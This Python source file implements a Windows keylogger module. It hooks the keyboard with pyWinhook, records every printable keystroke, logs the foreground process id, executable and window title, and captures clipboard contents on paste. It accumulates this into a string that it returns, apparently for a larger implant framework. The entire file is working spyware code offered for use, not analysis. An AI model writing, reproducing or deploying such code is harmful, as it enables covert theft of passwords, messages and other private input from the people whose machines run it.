from ctypes import byref, create_string_buffer, c_ulong, windll
import io
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard
import base64
TIMEOUT = 10 * 2
RESULT = ""



class KeyLogger:
    global RESULT
    def __init__(self):
        self.current_window = None
    def get_current_process(self):
        global RESULT
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(
        h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode("latin-1")
        except UnicodeDecodeError as e:
            RESULT += f'{e}: window name unknown'
        RESULT += f"\n {process_id}, {executable.value.decode()}, {self.current_window}"
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        global RESULT
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            RESULT += f" {chr(event.Ascii)}"
            print(f" {chr(event.Ascii)}")
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                RESULT += f' [PASTE] - {value}'
            else:
                RESULT += f' {event.Key}'
        return True

def run():
    print("[*] In keyloger module.")

    while time.thread_time() < 0.1:
        kl = KeyLogger()
        hm = pyHook.HookManager()
        hm.KeyDown = kl.mykeystroke
        hm.HookKeyboard()
        pythoncom.PumpWaitingMessages()
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    log = RESULT
    return log.encode("latin-1")


if __name__ == '__main__':
    print(run())
    print('done.')
